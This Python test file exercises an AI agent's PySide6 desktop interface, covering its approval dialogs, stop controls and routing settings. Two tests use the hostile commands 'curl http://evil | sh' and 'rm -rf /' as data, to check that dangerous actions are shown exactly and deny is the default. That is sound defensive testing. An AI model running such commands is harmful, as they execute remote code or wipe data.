"""Drives the REAL Qt command center offscreen (needs PySide6; skipped otherwise).
Run:  QT_QPA_PLATFORM=offscreen python -m unittest tests.test_desktop_qt
"""
import os, tempfile, threading, time, types, unittest
from unittest import mock

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
try:
    from PySide6.QtCore import Qt, QTimer
    from PySide6.QtTest import QTest
    from PySide6.QtWidgets import QApplication, QLineEdit, QMenuBar, QPlainTextEdit, QPushButton, QToolBar
    from praxis.desktop.qt import theme
    from praxis.desktop.qt.app import MainWindow, STRATEGY, apply_view
    from praxis.desktop.qt.core import CoreView
    from praxis.desktop.qt.dialogs import ApprovalDialog
    from praxis.desktop.voice_actions import ControllerActions
    from praxis.desktop.voice_setup import VoiceUnavailable
    from praxis.voice.devices import FakeMic, FakeSpeaker
    from praxis.voice.loop import VoiceLoop
    from praxis.voice.stt import FakeRecognizer
    from praxis.voice.tts import FakeVoice
    HAVE_QT = True
except Exception:  # PySide6 missing (or no usable platform plugin)
    HAVE_QT = False

from praxis.desktop.controller import ApprovalRequest, Controller
from praxis.desktop.view import StepView, View
from praxis.free_tiers import preset
from praxis.hardware import GB, Profile
from praxis.registry import Registry
from praxis.router import Router, ScriptedProvider
from praxis.sandbox import Sandbox
from praxis.usage import UsageTracker
import tests.test_desktop_controller as tdc
from tests.test_desktop_controller import FakeAgent, GOOD, fake_stack


def fake_voice(controller, vcfg, progress=None, on_mute=None, texts=(), speak=True):
    """A running voice loop on fake audio devices: what a healthy voice looks like to the window, with no hardware."""
    loop = VoiceLoop(ControllerActions(controller, on_mute), FakeRecognizer(texts), FakeMic(), FakeSpeaker(), FakeVoice(), speak=speak)
    loop.start()
    return loop


def no_voice(*a, **k):
    raise VoiceUnavailable("disabled for this test")


class FakeTelemetry:
    def sample(self):
        return {"cpu": 37.0, "ram_used_gb": 12.4, "ram_total_gb": 32.0, "ram_pct": 38.7,
                "gpus": [{"name": "RTX 3050", "util": 61, "vram_used_gb": 5.2, "vram_total_gb": 8.0, "temp": 64}]}


def qapp():
    app = QApplication.instance() or QApplication([])
    ui, mono = theme.fonts()
    app.setStyleSheet(theme.qss(ui, mono))
    return app


def pump(cond, timeout=10.0):
    app, end = QApplication.instance(), time.time() + timeout
    while time.time() < end:
        app.processEvents()
        if cond():
            return True
        time.sleep(0.01)
    return False


def cfg():
    return {"limits": {"max_steps": 20, "max_model_calls": 8, "max_cost_usd": 0}, "privacy": {"data_class": "project"},
            "routing": {"escalate": True, "max_escalations": 2}}


def multi_stack(providers, strategy="frugal", skipped=None, usage=None, agents=None):
    reg = Registry()
    return types.SimpleNamespace(providers=providers, router=Router(providers, {}, reg, strategy), agents=agents or {}, sandbox=Sandbox(),
                                 cfg=cfg(), registry=reg, skipped=skipped or {}, usage=usage or UsageTracker(),
                                 profile=Profile("linux", "cpu", 4, 16 * GB, 50, []))


def prov(name, privacy, tier=None, responses=None):
    p = ScriptedProvider(responses if responses is not None else [GOOD] * 6, name=name, privacy=privacy)
    p.tier = tier
    return p


class Autopilot:
    """Answers modal approval dialogs from inside the nested event loop, recording what the human would have seen."""
    def __init__(self, action):
        self.action, self.seen, self._done = action, [], set()
        self.timer = QTimer(); self.timer.timeout.connect(self.poll); self.timer.start(20)

    def poll(self):
        w = QApplication.activeModalWidget()
        if isinstance(w, ApprovalDialog) and id(w) not in self._done:
            self._done.add(id(w))
            self.seen.append({"text": w.findChildren(QPlainTextEdit)[0].toPlainText(), "cls": w.req.cls,
                              "deny_default": w.deny_btn.isDefault(), "deny_focused": w.focusWidget() is w.deny_btn,
                              "ok_default": w.ok_btn.isDefault()})
            self.action(w)



@unittest.skipUnless(HAVE_QT, "PySide6 not available")
class OneScreen(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.app = qapp()

    def make(self, stack=None, factory=None, approval_timeout=900.0, responses=None, agents=None, hook=None, voice_factory=None):
        ws, home = tempfile.mkdtemp(), tempfile.mkdtemp()
        st = stack or fake_stack(responses or [GOOD], agents, hook)
        ctl = Controller(ws, stack_factory=factory or (lambda w: st), home=home, approval_timeout=approval_timeout)
        ctl.start()
        win = MainWindow(ctl, voice_factory=voice_factory or fake_voice)
        win.show()
        self.addCleanup(lambda: (ctl.stop(), setattr(win, "_closing", True), win.timer.stop(), win.close()))
        self.assertTrue(pump(lambda: ctl.state == "idle"), ctl.error)
        return win, ctl, ws

    def goal(self, win, text):
        win.prompt.setText(text)
        win.prompt.returnPressed.emit()

    def verified(self, win):
        return lambda: win.core.title == "VERIFIED"

    def rich_stack(self, **kw):
        ps = [prov("ollama/qwen", "local", "local"), prov("groq/gpt-oss", "cloud", "free"), prov("gemini/flash", "open", "free"),
              prov("claude/sonnet", "cloud", "fast"), prov("claude/opus", "cloud", "balanced"), prov("claude/fable", "cloud", "best")]
        return multi_stack(ps, skipped={"cerebras": "no API key", "devin": "no DEVIN_API_KEY"}, **kw)

    # ---- it really is just the core -------------------------------------------------------------------------------
    def test_the_window_is_just_the_core_there_is_no_chat_box_and_no_mic_button(self):
        win, ctl, ws = self.make()
        self.assertEqual(win.menuBar().actions(), [])
        self.assertEqual(win.findChildren(QToolBar), []); self.assertEqual(win.findChildren(QPushButton), [])
        self.assertEqual(len(win.findChildren(CoreView)), 1)
        self.assertGreater(win.core.height(), win.height() * 0.95)                      # the core owns the whole window
        self.assertTrue(pump(lambda: win.voice is not None, 5)); self.assertFalse(win.prompt.isVisible())   # voice is up: no typing line

    def test_when_voice_cannot_start_a_typing_line_appears_so_the_app_is_never_unusable(self):
        win, ctl, ws = self.make(voice_factory=no_voice)
        self.assertTrue(pump(lambda: win.prompt.isVisible(), 5))
        self.assertIn("Voice is unavailable: disabled for this test", win.core.caption)

    def test_comes_up_ready_with_the_live_settings_on_the_core(self):
        win, ctl, ws = self.make(stack=self.rich_stack(strategy="frugal"))
        self.assertTrue(pump(lambda: win.core.title == "READY" and "ROUTING FRUGAL" in win.core.footer))
        self.assertIn("DATA PROJECT", win.core.footer); self.assertIn("6 MODELS", win.core.footer)
        self.assertIn("Ready", win.core.caption); self.assertEqual(os.path.basename(ws), os.path.basename(ws))
        self.assertIn(os.path.basename(ws), win.windowTitle())

    # ---- running a goal ------------------------------------------------------------------------------------------------
    def test_typing_an_outcome_and_pressing_enter_runs_it_and_the_core_tells_the_truth(self):
        win, ctl, ws = self.make()
        self.goal(win, "make a.txt")
        self.assertEqual(win.prompt.text(), "")                                         # cleared
        self.assertTrue(pump(self.verified(win)))
        self.assertTrue(os.path.exists(os.path.join(ws, "a.txt")))
        core = win.core
        self.assertEqual(core.ring_states(0), ["ran"]); self.assertEqual(core.ring_states(1), ["verified"])
        self.assertTrue(core.pipeline["sealed"]); self.assertEqual(core.legend()[2], ("VERIFY", "sealed", "ok"))
        self.assertEqual(core.progress, 1.0)
        self.assertTrue(pump(lambda: win.prompt.isEnabled() and ctl.state == "idle"))

    def test_an_empty_prompt_is_refused_politely(self):
        win, ctl, ws = self.make()
        self.goal(win, "   ")
        self.assertIn("Type the outcome", win.core.caption); self.assertEqual(ctl.state, "idle")

    def test_every_real_event_pulses_the_core_exactly_once_and_the_last_one_is_the_caption(self):
        win, ctl, ws = self.make()
        pulses = []
        orig = win.core.pulse
        win.core.pulse = lambda level="info": (pulses.append(level), orig(level))[1]
        self.goal(win, "make a.txt")
        self.assertTrue(pump(self.verified(win)))
        pump(lambda: False, 0.4)
        events = ctl.all_events()
        self.assertEqual(len(pulses), len(events))                                       # none missed, none doubled
        from praxis.desktop.view import summarize
        self.assertEqual(win.core.caption, summarize(events[-1])[0])
        self.assertEqual(win.core.cap_level, "ok"); self.assertIn("ok", pulses)

    def test_a_goal_started_before_the_first_tick_still_streams_its_events(self):
        """Regression: the history snapshot must not swallow the first goal's events."""
        ws, home = tempfile.mkdtemp(), tempfile.mkdtemp()
        ctl = Controller(ws, stack_factory=lambda w: fake_stack([GOOD]), home=home); ctl.start()
        win = MainWindow(ctl, voice_factory=fake_voice); win.show()
        self.addCleanup(lambda: (setattr(win, "_closing", True), win.timer.stop(), win.close()))
        end = time.time() + 5
        while ctl.state != "idle" and time.time() < end:      # wait WITHOUT letting the UI tick even once
            time.sleep(0.01)
        self.assertTrue(ctl.submit("make a.txt"))
        self.assertTrue(pump(self.verified(win)))
        self.assertIn("VERIFIED", win.core.caption)

    def test_a_goal_still_running_at_the_first_tick_streams_each_event_exactly_once(self):
        gate = threading.Event()
        ws, home = tempfile.mkdtemp(), tempfile.mkdtemp()
        ctl = Controller(ws, stack_factory=lambda w: fake_stack([GOOD], hook=lambda: gate.wait(10)), home=home); ctl.start()
        win = MainWindow(ctl, voice_factory=fake_voice); win.show()
        self.addCleanup(lambda: (gate.set(), setattr(win, "_closing", True), win.timer.stop(), win.close()))
        pulses = []
        orig = win.core.pulse
        win.core.pulse = lambda level="info": (pulses.append(level), orig(level))[1]
        end = time.time() + 5
        while ctl.state != "idle" and time.time() < end:
            time.sleep(0.01)
        self.assertTrue(ctl.submit("make a.txt"))
        pump(lambda: False, 0.5)                               # several ticks while the goal is blocked in the model
        gate.set()
        self.assertTrue(pump(self.verified(win)))
        pump(lambda: False, 0.4)
        self.assertEqual(len(pulses), len(ctl.all_events()))

    # ---- the core maps the real state ---------------------------------------------------------------------------------------
    def test_state_mapping(self):
        core = CoreView(); core.timer.stop(); self.addCleanup(core.close)
        steps = [StepView("s1", "fs.write", "w", 2, "verified"), StepView("s2", "shell.run", "r", 2, "running", ["s1"])]
        cases = [
            (View(status="RUNNING", steps=steps, goal_text="g"), "working", False, "working", "RUNNING", 0.5),
            (View(status="RUNNING", steps=steps), "working", True, "waiting", "NEEDS YOU", 0.5),
            (View(status="UNVERIFIED", reason="no real success check"), "idle", False, "stopped", "UNVERIFIED", 0.0),
            (View(status="FAILED", reason="boom", rolled_back=True), "idle", False, "bad", "FAILED", 0.0),
            (View(status="CANCELLED", rolled_back=True), "idle", False, "stopped", "STOPPED", 0.0),
            (View(status="VERIFIED", evidence=[{"passed": True, "claim": "c"}] * 3), "idle", False, "ok", "VERIFIED", 1.0),
            (View(), "stopping", False, "stopping", "STOPPING", 0.0),
            (View(), "starting", False, "starting", "STARTING", 0.0),
            (View(), "idle", False, "idle", "READY", 0.0),
        ]
        for view, state, waiting, mode, title, prog in cases:
            apply_view(core, view, state, waiting)
            self.assertEqual((core.mode, core.title, core.progress), (mode, title, prog), (view.status, state))
        apply_view(core, View(status="RUNNING", steps=steps, active_provider="groq/gpt-oss"), "working", False)
        self.assertEqual(core.active, "groq/gpt-oss")

    def test_the_view_maps_onto_the_three_rings(self):
        core = CoreView(); core.timer.stop(); self.addCleanup(core.close)
        steps = [StepView("s1", "fs.write", "w", 2, "verified"), StepView("s2", "shell.run", "r", 2, "running", ["s1"]),
                 StepView("s3", "fs.write", "x", 2, "pending", ["s2"])]
        sts = ["verified", "running", "pending"]
        cases = [
            (View(), ("none", [], [], False)),
            (View(status="PLANNING", goal_text="g"), ("planning", [], [], False)),
            (View(status="RUNNING", steps=steps), ("ready", sts, [], False)),
            (View(status="RUNNING", steps=steps, evidence=[{"passed": True, "claim": "a"}, {"passed": False, "claim": "b"}]), ("ready", sts, [True, False], False)),
            (View(status="VERIFIED", steps=steps, evidence=[{"passed": True, "claim": "a"}]), ("ready", sts, [True], True)),
            (View(status="VERIFIED", steps=steps), ("ready", sts, [], False)),                     # no evidence: never "sealed"
            (View(status="FAILED", reason="planning failed: no model", goal_text="g"), ("failed", [], [], False)),
            (View(status="FAILED", reason="step s2 failed", steps=steps), ("ready", sts, [], False)),
            (View(status="FAILED", reason="workspace is too large to checkpoint", goal_text="g"), ("none", [], [], False)),   # never planned
        ]
        for view, (plan, st, ck, sealed) in cases:
            apply_view(core, view, "idle", False)
            self.assertEqual((core.pipeline["plan"], core.pipeline["steps"], core.pipeline["checks"], core.pipeline["sealed"]),
                             (plan, st, ck, sealed), (view.status, view.reason))

    def test_the_core_lights_the_provider_in_flight_and_the_plan_ring_circles_while_planning(self):
        gate = threading.Event()
        win, ctl, ws = self.make(hook=lambda: gate.wait(10))
        self.addCleanup(gate.set)
        self.goal(win, "make a.txt")
        self.assertTrue(pump(lambda: win.core.active == "scripted", 5))                 # blocked INSIDE the model call
        self.assertEqual(win.core.title, "PLANNING"); self.assertEqual(win.core.pipeline["plan"], "planning")
        gate.set()
        self.assertTrue(pump(self.verified(win)))
        self.assertEqual(win.core.active, "")

    def test_no_models_explains_what_to_do_on_the_core(self):
        win, ctl, ws = self.make(stack=multi_stack([], skipped={"claude": "not installed"}))
        self.assertTrue(pump(lambda: win._loaded_ws == ctl.workspace))
        self.assertIn("No AI models", win.hint); self.assertIn("keys set", win.hint)
        self.assertTrue(pump(lambda: win.core.title == "SETUP NEEDED", 3))
        self.assertIn("keys set", win.core.caption)

    def test_boot_and_error_states_are_explained_on_the_core(self):
        gate = threading.Event()
        ws, home = tempfile.mkdtemp(), tempfile.mkdtemp()
        ctl = Controller(ws, stack_factory=lambda w: (gate.wait(10), fake_stack([GOOD]))[1], home=home); ctl.start()
        win = MainWindow(ctl, voice_factory=fake_voice); win.show()
        self.addCleanup(lambda: (gate.set(), setattr(win, "_closing", True), win.timer.stop(), win.close()))
        self.assertTrue(pump(lambda: "Booting" in win.core.caption, 3))
        self.assertEqual(win.core.footer, ""); self.assertFalse(win.prompt.isEnabled())
        gate.set()
        self.assertTrue(pump(lambda: win.core.title == "READY", 5)); self.assertTrue(win.prompt.isEnabled())
        def boom(w): raise RuntimeError("no providers configured")
        ctl2 = Controller(tempfile.mkdtemp(), stack_factory=boom, home=tempfile.mkdtemp()); ctl2.start()
        win2 = MainWindow(ctl2, voice_factory=fake_voice); win2.show()
        self.addCleanup(lambda: (setattr(win2, "_closing", True), win2.timer.stop(), win2.close()))
        self.assertTrue(pump(lambda: win2.core.title == "ERROR", 5))
        self.assertIn("no providers configured", win2.core.caption); self.assertEqual(win2.core.cap_level, "bad")

    # ---- approvals ----------------------------------------------------------------------------------------------------------
    def test_approval_dialog_shows_exact_action_defaults_to_deny_and_deny_blocks(self):
        win, ctl, ws = self.make(responses=[tdc.Approvals.PLAN], agents={"claude": FakeAgent()})
        pilot = Autopilot(lambda d: d.deny_btn.click())
        self.goal(win, "delegate it")
        self.assertTrue(pump(lambda: len(pilot.seen) == 1 and ctl.state == "idle"))
        seen = pilot.seen[0]
        self.assertIn("make made.txt", seen["text"]); self.assertEqual(seen["cls"], 3)
        self.assertTrue(seen["deny_default"]); self.assertTrue(seen["deny_focused"]); self.assertFalse(seen["ok_default"])
        self.assertFalse(os.path.exists(os.path.join(ws, "made.txt")))
        self.assertEqual(ctl.poll().view.status, "FAILED")

    def test_the_core_asks_for_you_while_an_approval_is_pending(self):
        win, ctl, ws = self.make(responses=[tdc.Approvals.PLAN], agents={"claude": FakeAgent()})
        seen = []
        pilot = Autopilot(lambda d: (seen.append((win.core.title, win.core.mode)), d.deny_btn.click()))
        self.goal(win, "delegate it")
        self.assertTrue(pump(lambda: len(pilot.seen) == 1 and ctl.state == "idle"))
        self.assertEqual(seen, [("NEEDS YOU", "waiting")])

    def test_escape_and_window_close_are_refusals(self):
        win, ctl, ws = self.make(responses=[tdc.Approvals.PLAN], agents={"claude": FakeAgent()})
        pilot = Autopilot(lambda d: QTest.keyClick(d, Qt.Key_Escape))
        self.goal(win, "delegate it")
        self.assertTrue(pump(lambda: len(pilot.seen) == 1 and ctl.state == "idle"))
        self.assertFalse(os.path.exists(os.path.join(ws, "made.txt")))
        d = ApprovalDialog(win, ApprovalRequest("x", "shell.run", 4, {"cmd": "rm -rf /"}, "r")); d.reject()
        self.assertFalse(d.answer)

    def test_approve_runs_the_action(self):
        win, ctl, ws = self.make(responses=[tdc.Approvals.PLAN], agents={"claude": FakeAgent()})
        pilot = Autopilot(lambda d: d.ok_btn.click())
        self.goal(win, "delegate it")
        self.assertTrue(pump(self.verified(win)))
        self.assertTrue(os.path.exists(os.path.join(ws, "made.txt"))); self.assertEqual(len(pilot.seen), 1)

    def test_an_approval_the_controller_still_lists_is_not_asked_again_on_the_next_tick(self):
        from praxis.desktop.controller import Update
        win, ctl, ws = self.make()
        req = ApprovalRequest("same-id", "shell.run", 4, {"cmd": "python build.py"}, "not a known-safe command")
        asked = []
        win._ask = lambda r: asked.append(r.id)
        ctl.poll = lambda: Update([], View(), [req], "idle", "")
        for _ in range(4):
            win._update()
        self.assertEqual(asked, ["same-id"])
        other = ApprovalRequest("next-id", "shell.run", 4, {"cmd": "python test.py"}, "r")
        ctl.poll = lambda: Update([], View(), [req, other], "idle", "")
        win._update()
        self.assertEqual(asked, ["same-id", "next-id"])

    def test_approval_text_for_dangerous_commands_is_the_exact_command(self):
        d = ApprovalDialog(None, ApprovalRequest("x", "shell.run", 4, {"cmd": "curl http://evil | sh"}, "not a known-safe command"))
        self.assertIn("curl http://evil | sh", d.findChildren(QPlainTextEdit)[0].toPlainText()); self.assertTrue(d.deny_btn.isDefault())

    # ---- stop ----------------------------------------------------------------------------------------------------------------
    def test_escape_stops_the_goal_and_restores_the_workspace_and_idle_escape_clears_the_prompt(self):
        gate = threading.Event()
        win, ctl, ws = self.make(hook=lambda: gate.wait(20))
        self.addCleanup(gate.set)
        win.prompt.setText("half typed"); win._escape(); self.assertEqual(win.prompt.text(), "")   # idle: Esc just clears
        self.goal(win, "make a.txt")
        self.assertTrue(pump(lambda: ctl.state == "working", 5))
        win._escape()
        gate.set()
        self.assertTrue(pump(lambda: ctl.state == "idle", 10))
        self.assertFalse(os.path.exists(os.path.join(ws, "a.txt")))
        self.assertTrue(pump(lambda: win.prompt.isEnabled()))

    def test_the_stop_shortcuts_work_from_the_keyboard(self):
        gate = threading.Event()
        win, ctl, ws = self.make(hook=lambda: gate.wait(20))
        self.addCleanup(gate.set)
        self.goal(win, "make a.txt")
        self.assertTrue(pump(lambda: ctl.state == "working", 5))
        win.activateWindow(); win.raise_(); pump(win.isActiveWindow, 3)              # a shortcut only fires in the active window
        QTest.keyClick(win, Qt.Key_Period, Qt.ControlModifier)
        self.assertTrue(pump(lambda: ctl.state == "stopping", 5))                    # the key itself registered (not a race with the goal)
        gate.set()
        self.assertTrue(pump(lambda: ctl.state == "idle", 10)); self.assertFalse(os.path.exists(os.path.join(ws, "a.txt")))

    # ---- data class and frugality, from the keyboard ---------------------------------------------------------------------------
    def test_f2_cycles_the_data_class_and_the_footer_follows_and_private_keeps_the_cloud_out(self):
        cloud = prov("groq/gpt-oss", "cloud", "free")
        win, ctl, ws = self.make(stack=multi_stack([cloud]))
        self.assertTrue(pump(lambda: "DATA PROJECT" in win.core.footer))
        win.cycle_data()
        self.assertEqual(ctl.effective_data_class(), "private")
        self.assertTrue(pump(lambda: "DATA PRIVATE" in win.core.footer))
        self.goal(win, "make a.txt")
        self.assertTrue(pump(lambda: ctl.state == "idle" and win.core.title == "FAILED", 10))
        self.assertEqual(cloud.calls, [])                                               # PRIVATE: the cloud model never saw the goal
        win.cycle_data(); win.cycle_data()                                              # private -> open -> project
        self.assertEqual(ctl.effective_data_class(), "project")
        self.goal(win, "make a.txt")
        self.assertTrue(pump(self.verified(win), 10)); self.assertGreater(len(cloud.calls), 0)

    def test_the_keys_are_wired(self):
        win, ctl, ws = self.make()
        win.activateWindow(); win.raise_(); pump(win.isActiveWindow, 3)
        QTest.keyClick(win, Qt.Key_F2)
        self.assertTrue(pump(lambda: ctl.effective_data_class() == "private", 3))
        QTest.keyClick(win, Qt.Key_F3)
        self.assertTrue(pump(lambda: ctl.frugality == "frugal", 3))

    def test_f3_cycles_frugality_through_the_real_router_strategies_and_frugal_never_touches_claude(self):
        st = self.rich_stack(strategy="auto")
        win, ctl, ws = self.make(stack=st)
        got = []
        for _ in range(3):
            win.cycle_frugality(); got.append(st.router.strategy)
        self.assertEqual(got, ["frugal", "measured", "auto"])                            # balanced -> frugal -> quality -> balanced
        self.assertEqual(STRATEGY, {"quality": "measured", "balanced": "auto", "frugal": "frugal"})
        win.cycle_frugality()
        self.assertTrue(pump(lambda: "ROUTING FRUGAL" in win.core.footer))
        self.goal(win, "make a.txt")
        self.assertTrue(pump(self.verified(win), 10))
        by = {p.card.name: len(p.calls) for p in st.providers}
        self.assertGreater(by["ollama/qwen"], 0); self.assertEqual(by["claude/opus"] + by["claude/sonnet"] + by["claude/fable"], 0)

    # ---- layout and folders -------------------------------------------------------------------------------------------------------
    def test_at_the_minimum_size_the_core_and_the_prompt_do_not_overlap(self):
        win, ctl, ws = self.make(stack=self.rich_stack(), voice_factory=no_voice)   # the typing line only shows when voice is unavailable
        self.assertTrue(pump(lambda: win.prompt.isVisible(), 5))
        win.resize(win.minimumWidth(), win.minimumHeight()); pump(lambda: False, 0.2)
        self.assertLessEqual(win.minimumSizeHint().height(), win.minimumHeight()); self.assertLessEqual(win.minimumSizeHint().width(), win.minimumWidth())
        self.assertLessEqual(win.core.geometry().bottom(), win.prompt.parentWidget().geometry().top() + 1)
        self.assertGreaterEqual(win.core.width(), 560); self.assertGreaterEqual(win.core.height(), 300)

    def test_switching_to_a_system_folder_is_refused(self):
        win, ctl, ws = self.make()
        with mock.patch("praxis.desktop.qt.app.QMessageBox.warning") as w:
            win._switch("/usr")
        self.assertTrue(w.called); self.assertEqual(ctl.workspace, os.path.realpath(ws))

    def test_resume_with_nothing_to_resume_says_so(self):
        win, ctl, ws = self.make()
        win.resume_goal(); self.assertIn("Nothing to resume", win.core.caption)


if __name__ == "__main__":
    unittest.main()
